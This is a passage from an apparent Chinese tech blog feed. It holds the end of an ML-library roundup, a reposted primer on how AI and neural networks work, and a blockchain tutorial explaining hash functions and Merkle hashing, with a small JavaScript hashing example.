title="MLPack"></a>MLPack</h3><p>“一个可扩展的 C++ 类型机器学习库”，语言：C++。<br>MLPack 是一款利用 C++ 来实现可扩展机器学习的软件库。由于它运行在 C++ 中，因此您完全可以想象到它对内存的高效管理。<br>由于在库中自带优质的机器学习算法，MLPack 运行起来速度极快。另外，该软件库对于新手来说十分“友好”，它提供了一个简单的 API。</p><p>想了解更多相关信息，可以参看：<a href="http://mlpack.org/">http://mlpack.org/</a></p><p><strong>优势：</strong></p><ul><li>扩展性极强。</li><li>提供 Python 和 C++ 的绑定。</li></ul><p><strong>劣势：</strong></p><ul><li>没有优质的文档。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本文在此所讨论到的各种软件库都是在大家长期使用之后，备受好评且高质量的。<br>像 Facebook、谷歌、雅虎、苹果和微软这样的大公司已经将它们运用到了各自的深度学习和机器学习的项目中。您还有什么理由不去试试呢?</p><p>开发者 AI</p>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十分钟了解人工智能AI的基础运作原理</title>
      <link href="/2022/11/21/%E5%8D%81%E5%88%86%E9%92%9F%E4%BA%86%E8%A7%A3%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BDAI%E7%9A%84%E5%9F%BA%E7%A1%80%E8%BF%90%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
      <url>/2022/11/21/%E5%8D%81%E5%88%86%E9%92%9F%E4%BA%86%E8%A7%A3%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BDAI%E7%9A%84%E5%9F%BA%E7%A1%80%E8%BF%90%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://cloud.tencent.com/developer/news/296050">十分钟了解人工智能AI的基础运作原理</a></p><h2 id="人工智能是如何运作的"><a href="#人工智能是如何运作的" class="headerlink" title="人工智能是如何运作的"></a>人工智能是如何运作的</h2><p>人工智能企图了解智能的实质，并生产出一种新的能以人类智能相似的方式做出反应的智能机器，该领域的研究包括机器人、语言识别、图像识别、自然语言处理和专家系统等。人工智能从诞生以来，理论和技术日益成熟，应用领域也不断扩大，可以预见未来几年将会进入“人工智能时代”。</p><p>目前AI已经在日常生活中产生了巨大的变化。<strong>这些AI并不是科幻电影中的那些有自我意识，计划摧毁地球的机器人。</strong>而是像我们的智能手机、智能家居、银行信用卡管家和智能汽车这些围绕我们每天生活的产品和服务都在使用AI。</p><p> AI将通过推动自动驾驶汽车的发展、改善医学图像分析、促进更好的医疗诊断和个性化医疗，从而带来社会的重大转变。<strong>AI也将是支撑未来技术发展的基础资源，就像电力和网络一样。</strong>但对大部分人来说，AI还是很诡异而且充满神秘感。</p><p><strong>那么我们今天就来聊一聊AI最重要的功能——模式识别的工作原理。</strong>希望通过简明扼要的介绍帮助大家了解这个领域。</p><p>AI是一门严谨科学而不是无所不能神话故事，有些媒体过分夸大报道AI的功能，鼓吹威胁论都是不负责任的。AI目标是设计具有智能的机器，其中的算法和技术部分借鉴了当下对人脑的研究成果。<strong>今天许多流行的AI系统使用人工神经网络来模拟由非常简单的互相连接单元组成的网络，有点像大脑中的神经元。</strong>这些网络可以通过调整单元之间的连接来学习经验，这个过程类似人类和动物的大脑通过修改神经元之间的连接来进行学习。<strong>神经网络可以学习模式识别、翻译语言、学习简单的逻辑推理，甚至创建图像或者形成新设计。</strong> 其中，<strong>模式识别是一项特别重要的功能，因为AI十分擅于识别海量数据中的隐藏的模式，而这对于依赖经验和知识的人类来说就没有那么容易。</strong>这些程序运行的神经网络具有数百万单位和数十亿的连接。我们现在所能创造出来的“智能”就是由这些电子神经元网络组成的。</p><p>机器不像人类具有感知器官和大脑，并且能够很好地协调工作，比如当我们看到一只狗的时候，就会很快的判断出来这是什么动物，并且具体什么种类。这个看似简单的过程对于机器来说都是十分困难的。而人类获得这样的能力，也是源自于生物上亿年的进化过程。<strong>而机器认识世界的方式是通过模型，需要通过复杂的算法和数据来构建模型，从而使机器获得很简单的感知和判断的能力。</strong></p><p>下面介绍一下深度学习系统中一个最重要算法——卷积神经网络。如果你之前对AI相关知识有所了解的话，那你一定听说这个概念。这种算法参考了生物学研究人类和其他动物大脑视觉皮层的结构。简单介绍一下这种特定类型的人工神经网络，<strong>它使用感知器、机器学习单元算法，用于监督学习分析数据。适用于图像处理、自然语言处理和其他类型的认知任务。</strong>与其他类型的人工神经网络一样，卷积神经网络具有输入层、输出层和各种隐藏层。其中一些层是卷积的，使用数学模型将结果传递给连续的层。这过程模拟了人类视觉皮层中的一些动作，所以称为卷积神经网路，也就是CNN。</p><p>举例子来看，当我们人类看到一只猫和一只狗时，尽管它们的体型很类似，但我们还是马上能够区分它们分别是猫和狗。<strong>对计算机而言，图像仅仅只是一串数据。</strong>在神经网络的第一层会通过特征检测物体的轮廓。神经网络的下一层将检测<strong>这些简单图案的组合所形成的简单形状</strong>，比如动物眼睛和耳朵。<strong>再下一层将检测这些形状组合所构成的物体的某些部分</strong>，例如猫和狗的头或者腿。神经网络的最后一层将检测刚才那些部分的组合：一只完整的猫、一只完整的狗等等。每一层的神经网络都会目标进行图像组合分析和特征检测，从而进行判断和组合，并将结果传递给下一层神经网络。实际使用的神经网络的层次深度会比这个例子多很多，所以神经网络能够以这种分层的方式进行复杂的模式识别。</p><p><strong>只要有大量被标记的样本数据库，就可以对神经网络进行特征训练。它对于识别图像、视频、语音、音乐甚至文本等信息特别有用。</strong>为了很好地训练AI的机器视觉，我们需要提供给这些神经网络被人标记的大量图像数据。神经网络会学习将每个图像与其相应的标签并相互关联起来。还能将以前从未见过的图像及其相应的标签配对。这样的系统可以梳理各种各样的图像，并且识别照片中的元素。同时神经网络在语音识别和文本识别中也非常有用，自动驾驶汽车和最新医学图像分析系统中也是关键组成部分，所以你可以看到神经网络的运用是非常广泛而且有效的。<strong>原来需要依赖人工标记大量有效数据来完成知识的输入，现在通过运行海量数据，让神经网络进行自我学习。</strong>大大提升的人工智能的应用范围，降低了使用的门槛。</p><p><strong>人类大脑与动物远远不同，在进化过程中高度特化并且具有明显的适应性。而当前的AI系统远远不具有人类拥有的看似一般的智能。</strong>人工智能更高级的发展将会在后面进行讨论，我们这里还是关注现在实现的AI的基本原理。</p><h2 id="AI最常见的三种学习方式"><a href="#AI最常见的三种学习方式" class="headerlink" title="AI最常见的三种学习方式"></a>AI最常见的三种学习方式</h2><p><strong>强化学习这是关于机器应该如何行动以获得最大化奖励的问题，</strong>它受行为心理学理论的启发。在特定场景下，机器挑选一个动作或一系列动作并获得奖励。<strong>机器行为每一步骤都会被标记，并且记录结果和赋予权重。</strong>强化学习通常用于教机器玩游戏和赢得比赛，比如国际象棋、围棋或简单的视频游戏。强化学习的问题是，单纯地强化学习需要海量的试错，才能学会简单的任务。好处是只要你提出一个有价值的问题，提供足够的数据输入，理论上来说强化学习最终会找到那个最优解。</p><p><strong>监督学习就是需要我们告诉机器特定输入的正确答案：</strong> 这是一幅汽车的图像，正确答案是“汽车”。它之所以被称为监督学习，是因为算法是从带标签数据学习的。这个过程类似于向年幼的孩子展示图画书。成年人预先知道正确的答案，孩子根据前面的例子做出推测。这也是训练神经网络和其他机器学习体系结构最常用的技术。</p><p><strong>无监督学习</strong>人类和大多数其他动物的学习过程，特别是刚生下来的时候，是以没有人监督的方式来进行学习的：<strong>我们通过观察和认知我们行动的结果来了解世界如何运作。</strong>没有人告诉我们刚开始所看到的每一个物体的名称和功能。但我们仍然学会非常基本的概念，当前我们还不知道如何在机器身上实现这一点，至少无法达到人类和其他动物的水平。缺乏用于无监督学习的AI技术，也是当前AI发展问题之一。</p><p>概括来说当前AI技术原理是：<strong>将大量数据与超强的运算处理能力和智能算法三者相结合起来，建立一个解决特定问题的模型，使程序能够自动地从数据中学习潜在的模式或特征，从而实现接近人类的思考方式。</strong>下面补充介绍三个AI研究领域重要的理论方法和技术以便理解：</p><h4 id="一、机器学习自动化分析建模"><a href="#一、机器学习自动化分析建模" class="headerlink" title="一、机器学习自动化分析建模"></a>一、机器学习自动化分析建模</h4><p>它使用来自神经网络、统计、数学和物理学的方法来发现数据中的隐藏模型，并且无需明确编程查找具体目标和范围。理论基础是这样的：假如我们为了研究某个复杂的科学问题，需要创建海量的机器学习模型、使用大量的算法、使用不同的参数配置，在这种情况下，我们就可以使用自动化的方式进行建模。发展自动化机器学习是为了向科学家提供帮助，而不是代替他们。这些方法使数据科学家摆脱了令人厌烦和复杂耗时的任务（比如详细的参数优化和调试），机器可以更好地解决这些任务。而后面的数据分析与结论的工作仍然需要人类专家来完成。<strong>在未来，理解行业应用领域的数据科学家，也就是数据业务架构师，仍然极其的重要。</strong>而这一项人工智能技术，将会辅助数据科学家建立模型并且加速验证的速度，从而减轻科学家的压力，让他们将精力放在那些机器无法完成的任务上面，<strong>通过更加合理的分工协作，大大加快科学技术研发速度。</strong></p><h4 id="二、深度学习领域"><a href="#二、深度学习领域" class="headerlink" title="二、深度学习领域"></a>二、深度学习领域</h4><p>这是应用非常广的技术，它使用具有多层处理单元的巨大神经网络，利用强大计算能力和改进的训练技术来学习大量数据中的复杂模式。<strong>原理是计算机在学习特定问题时，需要大量输入这个问题相关的学习材料也就是数据，然后在计算机通过算法和模型来构建对这个具体问题的认知，也就是总结出一个规律，</strong>那么在以后遇到相似问题时，计算机会把收集的数据转成特征值，如果这个特征值符合这前面规律里面的特征值，那么这个事物、行为或者模式，就可以被识别出来。常见的应用太多了，这里大概举一些例子：</p><p><strong>计算机视觉，这就像是机器的“眼睛”。</strong>依赖于模式识别和深度学习来识别图片或视频中的内容。当机器可以分析和理解图像时，他们可以实时捕捉图像或视频并解读周围环境。感知周围环境、识别可行驶区域以及识别行驶路径，这也是无人驾驶的基础技术。其中图像识别原理是通过识别图片中的对象，然后建立标签，实现对海量图片进行分类，也可以对图像中的人脸或者其他目标进行识别，运用在安防监控等领域；</p><p><strong>自然语言处理中语音识别技术就像是机器的“耳朵”：</strong>这是计算机分析、理解和生成人类语言和语音的能力。运用语音采集的技术和方法，对音频中的语言内容进行提取和识别，实现语音实时转文字的功能；下一阶段将会是自然语言交互，人们将可以使用普通的日常语言与计算机进行交流和执行任务。这也是AI语音助手和语音控制交互技术的基础。</p><p>机器翻译：模仿人脑理解语言的过程，形成更加符合语法规则同时更加容易被人理解的翻译，谷歌在线翻译功能就是运用了深度学习技术，让机器的翻译水平大大提升；</p><p>情感识别：通过识别新闻、社交媒体、论坛等文本内容中所包含的情感因素，<strong>及时了解网络用户对新闻的兴趣；</strong></p><p>医疗诊断：<strong>比如通过对各个阶段的肿瘤诊断这类医疗图像数据进行学习，总结出恶性肿瘤形状、纹理、结构等“特征”模型，从而使机器可以进行判断。</strong></p><p>可以看到深度学习在神经元网络的基础上，发展出了非常多的应用案例，并且当下各个行业的人工智能辅助工具和软件都在大力开发中，各种数据都在大量采集、清洗、输入模型训练，<strong>一旦训练成功就可以大规模部署，带来巨大的商业价值。</strong>具体有多大呢？参考一下人脸识别领域的独角企业估值和<strong>号称千亿的市场规模就知道了。如果这样的市场再乘以百倍、千倍呢，</strong>这里面的蕴含商业机会有多少呢？</p><h4 id="三、认知计算"><a href="#三、认知计算" class="headerlink" title="三、认知计算"></a>三、认知计算</h4><p>这也是人工智能的子领域，目标是与机器进行自然的、类似人类的交互。使用人工智能和认知计算，最终目标是让机器获得理解图像和语音的能力，模拟人类交流过程，从而实现与人类的自然对话。也是根据神经网络和深度学习来构建的，应用来自认知科学的知识来构建模拟人类思维过程的系统。它涵盖多个学科，包括机器学习、自然语言处理、视觉和人机交互。<strong>IBM Watson就是认知计算的一个例子，在美国答题竞赛节目上Watson展现了它先进的问答交互能力，并且打败了人类。</strong>与此，同时Watson这些服务应用接口也进行了开放，可提供其他组织用于视觉识别、语音识别、语言翻译以及对话引擎等等。</p><p>就像AI的产生是多学科发展的综合成果一样，当下AI的快速发展也是多方面技术进步综合起来取得的成果，总结里面重要的三个方面：</p><p>1.硬件方面：</p><p>直到本世纪初研究人员才意识到，为视频游戏设计的GPU图形处理单元可以被用作硬件加速器，以运行比以前更大的神经网络。这要归功于这些芯片能够进行大量并行计算，而不是像传统CPU那样按顺序处理它们。这对于同时计算构成深度学习神经网络的数百个神经元的权重特别有用。</p><p>2.通用算法：</p><p>AI这么快就流行起来，在很大程度上是因为开放的软件工具也称为框架，使得构建和训练一个神经网络实现目标应用程序变得容易起来，即使是使用各种不同的编程语言。对于已知的识别目标，可以离线定义和训练一个神经网络。<strong>一旦训练完成，神经网络可以很容易地部署到嵌入式平台上，也可以迁移到各种软件程序和硬件平台中。</strong>这是一个聪明的架构，允许<strong>借助PC或云的能力训练神经网络，而低功耗的嵌入式处理器只需使用训练好的数据来进行识别。</strong>人体和物体的能力与流行的应用密切相关，比如工业机器人和自动驾驶汽车。</p><p>3.其他技术支持：</p><p>图形处理单元是AI的关键，因为它们提供了迭代处理所需的大量计算能力。训练神经网络需要大数据和计算能力。而物联网从连接的设备生成大量数据，其中大部分未经分析。使用AI自动化模型将允许我们使用更多的物联网数据进行分析，将物流和信息流更好的结合起来。还有就是AI应用程序接口，可以将AI功能添加到现有产品和软件中。比如它们可以为安防视频中添加图像识别功能；也可以在我们观看网络视频时，自动创建翻译和字幕；或者是在相机中识别人物性别和年纪甚至是表情和状态等等，应用将会非常广泛。</p><p>总之，这都是AI经常使用的方法，<strong>即使我们创造了单个项目拥有超越人类智慧的机器，这些机器仍然能力有限。短期来看，人工智能将提供接近人类交互体验，</strong>并为特定任务提供辅助支持，但它还不能成为人类的替代品，有自我意识的AI还不会很快出现。</p><p>本篇是老张创作的课程《人工智能进化论课程》基础篇内容，转载需授权。</p><p>觉得有帮助的话请转发和评论~</p>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链原理</title>
      <link href="/2022/10/09/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86/"/>
      <url>/2022/10/09/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1311929706479649">区块链原理</a></p><p>区块链就是一个不断增长的全网总账本，每个完全节点都拥有完整的区块链，并且，节点总是信任最长的区块链，伪造区块链需要拥有超过51%的全网算力。</p><p>区块链的一个重要特性就是不可篡改。为什么区块链不可篡改？我们先来看区块链的结构。</p><p>区块链是由一个一个区块构成的有序链表，每一个区块都记录了一系列交易，并且，每个区块都指向前一个区块，从而形成一个链条：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-22af64eb38e7e101.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>如果我们观察某一个区块，就可以看到，每个区块都有一个唯一的哈希标识，被称为区块哈希，同时，区块通过记录上一个区块的哈希来指向上一个区块：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-cf83a62b422931e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>每一个区块还有一个Merkle哈希用来确保该区块的所有交易记录无法被篡改。</p><p>区块链中的主要数据就是一系列交易，第一条交易通常是Coinbase交易，也就是矿工的挖矿奖励，后续交易都是用户的交易。</p><p>区块链的不可篡改特性是由哈希算法保证的。</p><h1 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h1><p>我们来简单介绍一下什么是哈希算法。</p><p>哈希算法，又称散列算法，它是一个单向函数，可以把任意长度的输入数据转化为固定长度的输出：</p><p>h=H(x)h=H(x)</p><p>例如，对morning和bitcoin两个输入进行某种哈希运算，得到的结果是固定长度的数字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">H(&quot;morning&quot;) &#x3D; c7c3169c21f1d92e9577871831d067c8</span><br><span class="line">H(&quot;bitcoin&quot;) &#x3D; cd5b1e4947e304476c788cd474fb579a</span><br></pre></td></tr></table></figure><p>我们通常用十六进制表示哈希输出。</p><p>因为哈希算法是一个单向函数，要设计一个安全的哈希算法，就必须满足：通过输入可以很容易地计算输出，但是，反过来，通过输出无法反推输入，只能暴力穷举。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">H(&quot;???????&quot;) &#x3D; c7c3169c21f1d92e9577871831d067c8</span><br><span class="line">H(&quot;???????&quot;) &#x3D; cd5b1e4947e304476c788cd474fb579a</span><br></pre></td></tr></table></figure><p>想要根据上述结果反推输入，只能由计算机暴力穷举。</p><h1 id="哈希碰撞"><a href="#哈希碰撞" class="headerlink" title="哈希碰撞"></a>哈希碰撞</h1><p>一个安全的哈希算法还需要满足另一个条件：碰撞率低。</p><p>碰撞是指，如果两个输入数据不同，却恰好计算出了相同的哈希值，那么我们说发生了碰撞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">H(&quot;data-123456&quot;) &#x3D; a76b1fb579a02a476c789d9115d4b201</span><br><span class="line">H(&quot;data-ABCDEF&quot;) &#x3D; a76b1fb579a02a476c789d9115d4b201</span><br></pre></td></tr></table></figure><p>因为输入数据长度是不固定的，所以输入数据是一个无限大的集合，而输出数据长度是固定的，所以，输出数据是一个有限的集合。把一个无限的集合中的每个元素映射到一个有限的集合，就必然存在某些不同的输入得到了相同的输出。</p><p>哈希碰撞的本质是把无限的集合映射到有限的集合时必然会产生碰撞。我们需要计算的是碰撞的概率。很显然，碰撞的概率和输出的集合大小相关。输出位数越多，输出集合就越大，碰撞率就越低。</p><p>安全哈希算法还需要满足一个条件，就是输出无规律。输入数据任意一个bit（某个字节的某一个二进制位）的改动，会导致输出完全不同，从而让攻击者无法逐步猜测输入，只能依赖暴力穷举来破解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">H(&quot;hello-1&quot;) &#x3D; 970db54ab8a93b7173cb48f55e67fd2c</span><br><span class="line">H(&quot;hello-2&quot;) &#x3D; 8284353b768977f05ac600baad8d3d17</span><br></pre></td></tr></table></figure><p>哈希算法有什么作用？假设我们相信一个安全的哈希算法，那么我们认为，如果两个输入的哈希相同，我们认为两个输入是相同的。</p><p>如果输入的内容就是文件内容，而两个文件的哈希相同，说明文件没有被修改过。当我们从网站上下载一个非常大的文件时，我们如何确定下载到本地的文件和官方网站发布的原始文件是完全相同，没有经过修改的呢？哈希算法就体现出了作用：我们只需要计算下载到本地的文件哈希，再和官方网站给出的哈希对比，如果一致，说明下载文件是正确的，没有经过篡改，如果不一致，则说明下载的文件肯定被篡改过。</p><p>大多数软件的官方下载页面会同时给出该文件的哈希值，以便让用户下载后验证文件是否被篡改：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-ab624ffe78b044b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>和文件类似，如果两份数据的哈希相同，则可以100%肯定，两份数据是相同的。比特币使用哈希算法来保证所有交易不可修改，就是计算并记录交易的哈希，如果交易被篡改，那么哈希验证将无法通过，说明这个区块是无效的。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-af4aa067766e2d55.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="常用哈希算法"><a href="#常用哈希算法" class="headerlink" title="常用哈希算法"></a>常用哈希算法</h1><p>常用的哈希算法以及它们的输出长度如下：</p><table><thead><tr><th>哈希算法</th><th>输出长度(bit)</th><th>输出长度(字节)</th></tr></thead><tbody><tr><td>MD5</td><td>128 bit</td><td>16 bytes</td></tr><tr><td>RipeMD160</td><td>160 bits</td><td>20 bytes</td></tr><tr><td>SHA-1</td><td>160 bits</td><td>20 bytes</td></tr><tr><td>SHA-256</td><td>256 bits</td><td>32 bytes</td></tr><tr><td>SHA-512</td><td>512 bits</td><td>64 bytes</td></tr></tbody></table><p>比特币使用的哈希算法有两种：SHA-256和RipeMD160</p><p>SHA-256的理论碰撞概率是：尝试2的130次方的随机输入，有99.8%的概率碰撞。注意2130是一个非常大的数字，大约是1361万亿亿亿亿。以现有的计算机的计算能力，是不可能在短期内破解的。</p><p>比特币使用两种哈希算法，一种是对数据进行两次SHA-256计算，这种算法在比特币协议中通常被称为hash256或者dhash。</p><p>另一种算法是先计算SHA-256，再计算RipeMD160，这种算法在比特币协议中通常被称为hash160。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">const</span><br><span class="line">    bitcoin &#x3D; require(&#39;bitcoinjs-lib&#39;),</span><br><span class="line">    createHash &#x3D; require(&#39;create-hash&#39;);</span><br><span class="line"></span><br><span class="line">function standardHash(name, data) &#123;</span><br><span class="line">    let h &#x3D; createHash(name);</span><br><span class="line">    return h.update(data).digest();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hash160(data) &#123;</span><br><span class="line">    let h1 &#x3D; standardHash(&#39;sha256&#39;, data);</span><br><span class="line">    let h2 &#x3D; standardHash(&#39;ripemd160&#39;, h1);</span><br><span class="line">    return h2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hash256(data) &#123;</span><br><span class="line">    let h1 &#x3D; standardHash(&#39;sha256&#39;, data);</span><br><span class="line">    let h2 &#x3D; standardHash(&#39;sha256&#39;, h1);</span><br><span class="line">    return h2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let s &#x3D; &#39;bitcoin is awesome&#39;;</span><br><span class="line">console.log(&#39;ripemd160 &#x3D; &#39; + standardHash(&#39;ripemd160&#39;, s).toString(&#39;hex&#39;));</span><br><span class="line">console.log(&#39;  hash160 &#x3D; &#39; + hash160(s).toString(&#39;hex&#39;));</span><br><span class="line">console.log(&#39;   sha256 &#x3D; &#39; + standardHash(&#39;sha256&#39;, s).toString(&#39;hex&#39;));</span><br><span class="line">console.log(&#39;  hash256 &#x3D; &#39; + hash256(s).toString(&#39;hex&#39;));</span><br></pre></td></tr></table></figure><p>运行上述代码，观察对一个字符串进行SHA-256、RipeMD160、hash256和hash160的结果。</p><h1 id="区块链不可篡改特性"><a href="#区块链不可篡改特性" class="headerlink" title="区块链不可篡改特性"></a>区块链不可篡改特性</h1><p>有了哈希算法的预备知识，我们来看比特币的区块链如何使用哈希算法来防止交易记录被篡改。</p><p>区块本身记录的主要数据就是一系列交易，所以，区块链首先要保证任何交易数据都不可修改。</p><h4 id="Merkle-Hash"><a href="#Merkle-Hash" class="headerlink" title="Merkle Hash"></a>Merkle Hash</h4><p>在区块的头部，有一个Merkle Hash字段，它记录了本区块所有交易的Merkle Hash：</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-03f1f2b3b0d1c194.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>Merkle Hash是把一系列数据的哈希根据一个简单算法变成一个汇总的哈希。</p><p>假设一个区块有4个交易，我们对每个交易数据做dhash，得到4个哈希值a1，a2，a3和a4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a1 &#x3D; dhash(tx1)</span><br><span class="line">a2 &#x3D; dhash(tx2)</span><br><span class="line">a3 &#x3D; dhash(tx3)</span><br><span class="line">a4 &#x3D; dhash(tx4)</span><br></pre></td></tr></table></figure><p>注意到哈希值也可以看做数据，所以可以把a1和a2拼起来，a3和a4拼起来，再计算出两个哈希值b1和b2：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-7a570060646e465d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>最后，把b1和b2这两个哈希值拼起来，计算出最终的哈希值，这个哈希就是Merkle Hash：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-c401b6b7833b8453.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>如果交易的数量不恰好是4个怎么办？例如，只有3个交易时，第一个和第二个交易的哈希a1和a2可以拼起来算出b1，第三个交易只能算出一个哈希a3，这个时候，就把a3直接复制一份，算出b2，这样，我们也能最终计算出Merkle Hash：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-6f06e62a7fb77c6d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>如果有5个交易，我们可以看到，a5被复制了一份，以便计算出b3，随后b3也被复制了一份，以便计算出c2。总之，在每一层计算中，如果有单数，就把最后一份数据复制，最后一定能计算出Merkle Hash：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-1c773155dea245f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>从Merkle Hash的计算方法可以得出结论：修改任意一个交易哪怕一个字节，或者交换两个交易的顺序，都会导致Merkle Hash验证失败，也就会导致这个区块本身是无效的，所以，Merkle Hash记录在区块头部，它的作用就是保证交易记录永远无法修改。</p><h4 id="Block-Hash"><a href="#Block-Hash" class="headerlink" title="Block Hash"></a>Block Hash</h4><p>区块本身用Block Hash——也就是区块哈希来标识。但是，一个区块自己的区块哈希并没有记录在区块头部，而是通过计算区块头部的哈希得到的：</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-b793aa3c255ea3ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>区块头部的Prev Hash记录了上一个区块的Block Hash，这样，可以通过Prev Hash追踪到上一个区块。</p><p>由于下一个区块的Prev Hash又会指向当前区块，这样，每个区块的Prev Hash都指向自己的上一个区块，这些区块串起来就形成了区块链。</p><p>区块链的第一个区块（又称创世区块）并没有上一个区块，因此，它的Prev Hash被设置为00000000…000。</p><p>如果一个恶意的攻击者修改了一个区块中的某个交易，那么Merkle Hash验证就不会通过。所以，他只能重新计算Merkle Hash，然后把区块头的Merkle Hash也修改了。这时，我们就会发现，这个区块本身的Block Hash就变了，所以，下一个区块指向它的链接就断掉了。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-ac4076ea1c4b03df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>由于比特币区块的哈希必须满足一个难度值，因此，攻击者必须先重新计算这个区块的Block Hash，然后，再把后续所有区块全部重新计算并且伪造出来，才能够修改整个区块链。</p><p>在后面的挖矿中，我们会看到，修改一个区块的成本就已经非常非常高了，要修改后续所有区块，这个攻击者必须掌握全网51%以上的算力才行，所以，修改区块链的难度是非常非常大的，并且，由于正常的区块链在不断增长，同样一个区块，修改它的难度会随着时间的推移而不断增加。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>区块链依靠安全的哈希算法保证所有区块数据不可更改；</p><p>交易数据依靠Merkle Hash确保无法修改，整个区块依靠Block Hash确保区块无法修改；</p><p>工作量证明机制（挖矿）保证修改区块链的难度非常巨大从而无法实现。</p><p>可以查看逐层揭秘：<a href="https://www.woshipm.com/blockchain/953408.html">区块链的运作原理、存在问题以及前景</a>, 这篇也写的不错。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是区块链技术？</title>
      <link href="/2022/10/09/%E4%BB%80%E4%B9%88%E6%98%AF%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%EF%BC%9F/"/>
      <url>/2022/10/09/%E4%BB%80%E4%B9%88%E6%98%AF%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="1-什么是区块链技术？"><a href="#1-什么是区块链技术？" class="headerlink" title="1. 什么是区块链技术？"></a>1. 什么是区块链技术？</h1><p>区块链技术是一种高级数据库机制，允许在企业网络中透明地共享信息。区块链数据库将数据存储在区块中，而数据库则一起链接到一个链条中。数据在时间上是一致的，因为在没有网络共识的情况下，您不能删除或修改链条。因此，您可以使用区块链技术创建不可改变的分类账，以便跟踪订单、付款、账户和其他交易。系统内置的机制可以阻止未经授权的交易条目并在这些交易的共享视图中创建一致性。</p><h1 id="2-为什么区块链很重要？"><a href="#2-为什么区块链很重要？" class="headerlink" title="2. 为什么区块链很重要？"></a>2. 